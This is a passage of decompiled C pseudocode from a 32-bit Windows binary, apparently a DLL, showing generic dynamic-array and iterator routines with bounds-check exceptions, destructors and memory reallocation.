  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003EBFE) --------------------------------------------------------
int __thiscall sub_1003EBFE(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003EC26) --------------------------------------------------------
int __thiscall sub_1003EC26(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003EC61) --------------------------------------------------------
int __thiscall sub_1003EC61(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003EC7A) --------------------------------------------------------
_DWORD *__thiscall sub_1003EC7A(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100956F4;
  a2[1] = this;
  *a2 = &off_10095854;
  a2[2] = a3;
  return result;
}
// 100956F4: using guessed type int (__thiscall *off_100956F4)(void *Block, char);
// 10095854: using guessed type int (__thiscall *off_10095854)(void *Block, char);

//----- (1003ECB2) --------------------------------------------------------
void *__thiscall sub_1003ECB2(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074F33;
  *this = &off_10095854;
  *this = &off_100956F4;
  return result;
}
// 100956F4: using guessed type int (__thiscall *off_100956F4)(void *Block, char);
// 10095854: using guessed type int (__thiscall *off_10095854)(void *Block, char);

//----- (1003ECDC) --------------------------------------------------------
bool __thiscall sub_1003ECDC(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003ECF3) --------------------------------------------------------
BOOL __thiscall sub_1003ECF3(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003ECFD) --------------------------------------------------------
int __thiscall sub_1003ECFD(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003ED38) --------------------------------------------------------
int __thiscall sub_1003ED38(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003ED6E) --------------------------------------------------------
int __thiscall sub_1003ED6E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1003ED96) --------------------------------------------------------
int __thiscall sub_1003ED96(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1003EDD1) --------------------------------------------------------
int __thiscall sub_1003EDD1(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1003EDEA) --------------------------------------------------------
_DWORD *__thiscall sub_1003EDEA(_DWORD *Block, char a2)
{
  sub_1003EF3B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE07) --------------------------------------------------------
_DWORD *__thiscall sub_1003EE07(_DWORD *Block, char a2)
{
  sub_1003DF5E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE23) --------------------------------------------------------
_DWORD *__thiscall sub_1003EE23(_DWORD *Block, char a2)
{
  sub_1003DFC2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE3F) --------------------------------------------------------
_DWORD *__thiscall sub_1003EE3F(_DWORD *Block, char a2)
{
  sub_1003E132(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE5B) --------------------------------------------------------
_DWORD *__thiscall sub_1003EE5B(_DWORD *Block, char a2)
{
  sub_1003E2A2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE77) --------------------------------------------------------
_DWORD *__thiscall sub_1003EE77(_DWORD *Block, char a2)
{
  sub_1003E412(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE93) --------------------------------------------------------
_DWORD *__thiscall sub_1003EE93(_DWORD *Block, char a2)
{
  sub_1003E582(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EEAF) --------------------------------------------------------
_DWORD *__thiscall sub_1003EEAF(_DWORD *Block, char a2)
{
  sub_1003E6F2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EECB) --------------------------------------------------------
_DWORD *__thiscall sub_1003EECB(_DWORD *Block, char a2)
{
  sub_1003E862(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EEE7) --------------------------------------------------------
_DWORD *__thiscall sub_1003EEE7(_DWORD *Block, char a2)
{
  sub_1003E9D2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EF03) --------------------------------------------------------
_DWORD *__thiscall sub_1003EF03(_DWORD *Block, char a2)
{
  sub_1003EB42(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EF1F) --------------------------------------------------------
_DWORD *__thiscall sub_1003EF1F(_DWORD *Block, char a2)
{
  sub_1003ECB2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EF3B) --------------------------------------------------------
void __stdcall sub_1003EF3B(_DWORD *a1)
{
  sub_1003DF5E(a1 + 2);
  *a1 = &off_10095320;
}
// 10095320: using guessed type int (__thiscall *off_10095320)(void *Block, char);

//----- (1003EFF0) --------------------------------------------------------
_DWORD *__stdcall sub_1003EFF0(_DWORD *a1)
{
  *a1 = off_1009531C;
  sub_100099CF((int)(a1 + 2), 0);
  return a1;
}
// 1009531C: using guessed type int (__thiscall *off_1009531C[2])(void *Block, char);

//----- (1003F02A) --------------------------------------------------------
char __usercall sub_1003F02A@<al>(int a1@<eax>, int a2@<ecx>)
{
  int v3; // esi
  char result; // al

  v3 = a2 + 8;
  sub_1003F10C((_DWORD *)(a2 + 8), (_DWORD *)a1);
  result = *(_BYTE *)(a1 + 8);
  *(_BYTE *)(v3 + 8) = result;
  return result;
}

//----- (1003F06B) --------------------------------------------------------
_DWORD *__userpurge sub_1003F06B@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003F0AF) --------------------------------------------------------
void __thiscall sub_1003F0AF(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100415B9((int)this);
}

//----- (1003F10C) --------------------------------------------------------
_DWORD *__usercall sub_1003F10C@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_1000AF7E((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1003F13C) --------------------------------------------------------
void **__thiscall sub_1003F13C(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (1003F17B) --------------------------------------------------------
void *__thiscall sub_1003F17B(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10095380;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_1003C1DB((_DWORD *)this);
}
// 10095380: using guessed type int (__thiscall *off_10095380)(void *Block, char);

//----- (1003F1D9) --------------------------------------------------------
int __thiscall sub_1003F1D9(_DWORD *this)
{
  return this[1];
}

//----- (1003F1DD) --------------------------------------------------------
int __thiscall sub_1003F1DD(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B6667);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (1003F238) --------------------------------------------------------
int __thiscall sub_1003F238(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1003F250) --------------------------------------------------------
int __thiscall sub_1003F250(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6668);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1003F299) --------------------------------------------------------
int __thiscall sub_1003F299(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6669);
  return this[3] + 4 * a2;
}

//----- (1003F2B7) --------------------------------------------------------
int __thiscall sub_1003F2B7(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B666A);
  return this[3] + 4 * a2;
}

//----- (1003F2D5) --------------------------------------------------------
void __thiscall sub_1003F2D5(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (1003F2F7) --------------------------------------------------------
int __thiscall sub_1003F2F7(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1003F31B) --------------------------------------------------------
BOOL __thiscall sub_1003F31B(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1003F326) --------------------------------------------------------
int __thiscall sub_1003F326(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1003F365) --------------------------------------------------------
unsigned int __thiscall sub_1003F365(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B666B);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1003F3D7) --------------------------------------------------------
unsigned int __thiscall sub_1003F3D7(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1003F3FF) --------------------------------------------------------
unsigned int __stdcall sub_1003F3FF(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1003F410) --------------------------------------------------------
unsigned int __thiscall sub_1003F410(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003F46D) --------------------------------------------------------
void __thiscall sub_1003F46D(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003F523) --------------------------------------------------------
int *__thiscall sub_1003F523(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_1000AF08(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (1003F565) --------------------------------------------------------
void *__thiscall sub_1003F565(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100953E0;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_1000AF08(v2);
  this[3] = 0;
  v5 = -1;
  return sub_1003C700(this);
}
// 100953E0: using guessed type int (__thiscall *off_100953E0)(void *Block, char);

//----- (1003F5C6) --------------------------------------------------------
int __thiscall sub_1003F5C6(_DWORD *this)
{
  return this[1];
}

//----- (1003F5CA) --------------------------------------------------------
char __thiscall sub_1003F5CA(_DWORD *this, int a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int v7; // eax
  int v8; // ecx
  _DWORD *v9; // eax
  _DWORD *v10; // edi
  bool v11; // zf
  int v12; // ebx
  char result; // al
  _DWORD *v14; // [esp+Ch] [ebp-8h]
  int v15; // [esp+10h] [ebp-4h]
  int v16; // [esp+20h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B666C);
  v5 = *this;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v7 > a3 )
  {
    v8 = 12 * v7;
    v16 = 12 * v7;
    v15 = v7 - a3;
    while ( 1 )
    {
      v9 = (_DWORD *)(v8 + this[3]);
      v10 = v9 - 3;
      v14 = v9;
      sub_1003F10C(v9, v9 - 3);
      v16 -= 12;
      v11 = v15-- == 1;
      *((_BYTE *)v14 + 8) = *((_BYTE *)v10 + 8);
      if ( v11 )
        break;
      v8 = v16;
    }
  }
  v12 = this[3] + 12 * a3;
  sub_1003F10C((_DWORD *)v12, (_DWORD *)a2);
  result = *(_BYTE *)(a2 + 8);
  *(_BYTE *)(v12 + 8) = result;
  ++this[1];
  return result;
}

//----- (1003F65A) --------------------------------------------------------
int __thiscall sub_1003F65A(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1003F672) --------------------------------------------------------
int __thiscall sub_1003F672(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  int v4; // ebx
  int v5; // ebx
  unsigned int v7; // [esp+Ch] [ebp-4h]
  int v8; // [esp+18h] [ebp+8h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B666D);
  v3 = *this;
  --this[1];
  v7 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v8 = 12 * a2;
    do
    {
      v4 = this[3] + v8;
      sub_1003F10C((_DWORD *)v4, (_DWORD *)(v4 + 12));
      ++v7;
      v8 += 12;
      *(_BYTE *)(v4 + 8) = *(_BYTE *)(v4 + 20);
    }
    while ( v7 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v5 = this[3] + 12 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1003F10C((_DWORD *)v5, dword_100BFA2C);
  *(_BYTE *)(v5 + 8) = byte_100BFA34;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BFA2C: using guessed type _DWORD dword_100BFA2C[2];
// 100BFA34: using guessed type char byte_100BFA34;

//----- (1003F6FD) --------------------------------------------------------
int __thiscall sub_1003F6FD(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B666E);
  return this[3] + 12 * a2;
}

//----- (1003F71C) --------------------------------------------------------
int __thiscall sub_1003F71C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B666F);
  return this[3] + 12 * a2;
}

//----- (1003F73B) --------------------------------------------------------
char *__thiscall sub_1003F73B(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_1000AF08(v3);
  }
  return result;
}

//----- (1003F761) --------------------------------------------------------
int __thiscall sub_1003F761(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_1000AF08(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1003F788) --------------------------------------------------------
BOOL __thiscall sub_1003F788(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1003F793) --------------------------------------------------------
int __thiscall sub_1003F793(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  unsigned int v8; // [esp+8h] [ebp-8h]
  int i; // [esp+Ch] [ebp-4h]

  v2 = a2;
  v8 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 12 * a2;
    for ( i = 12 * a2; ; v4 = i )
    {
      v5 = v4 + this[3];
      sub_1003F10C((_DWORD *)v5, dword_100BFA2C);
      ++v8;
      i += 12;
      *(_BYTE *)(v5 + 8) = byte_100BFA34;
      if ( v8 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
        break;
    }
    v2 = a2;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v6 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v6 + 88))(this);
}
// 100BFA2C: using guessed type _DWORD dword_100BFA2C[2];
// 100BFA34: using guessed type char byte_100BFA34;

//----- (1003F801) --------------------------------------------------------
unsigned int __thiscall sub_1003F801(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6670);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1003F87D) --------------------------------------------------------
unsigned int __thiscall sub_1003F87D(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1003F8A5) --------------------------------------------------------
unsigned int __stdcall sub_1003F8A5(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1003F8B6) --------------------------------------------------------
unsigned int __thiscall sub_1003F8B6(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v10; // eax
  unsigned int result; // eax
  char *v13; // ebx
  unsigned int v14; // [esp+20h] [ebp+8h]
  char *Blocka; // [esp+28h] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (12 * (unsigned __int64)(unsigned int)v5) >> 32 != 0 ? -1 : 12 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 0xCu, v5, (void (__thiscall *)(void *))sub_100413FE, sub_1000A9D3);
  }
  v14 = 0;
  this[1] = a2;
  v10 = *this;
  this[3] = v8;
  result = (*(int (__thiscall **)(_DWORD *))(v10 + 4))(this);
  if ( result )
  {
    Blocka = 0;
    do
    {
      v13 = &Blocka[this[3]];
      sub_1003F10C(v13, (_DWORD *)a3);
      ++v14;
      Blocka += 12;
      v13[8] = *(_BYTE *)(a3 + 8);
      a3 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v14 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1003F977) --------------------------------------------------------
void *__thiscall sub_1003F977(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  char *v7; // edi
  int v8; // ecx
  int *v9; // eax
  char *v10; // ebx
  _BYTE *v11; // ebx
  char *v12; // [esp+8h] [ebp-20h]
  char *Block; // [esp+Ch] [ebp-1Ch]
  unsigned int v14; // [esp+10h] [ebp-18h]
  int v15; // [esp+14h] [ebp-14h]
  char *v16; // [esp+18h] [ebp-10h]

  result = &loc_1007AE1B;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
